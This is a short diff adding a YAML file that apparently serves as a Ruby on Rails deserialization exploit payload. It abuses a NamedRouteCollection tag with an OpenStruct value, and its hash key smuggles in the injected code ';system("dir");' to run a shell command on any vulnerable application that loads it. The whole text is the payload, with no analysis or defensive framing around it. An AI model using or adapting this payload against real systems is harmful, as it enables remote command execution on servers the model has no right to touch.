@@ -1,0 +1,5 @@
+--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  
+';system("dir");' :
+ !ruby/object:OpenStruct
+  table:  
+   :defaults: {}
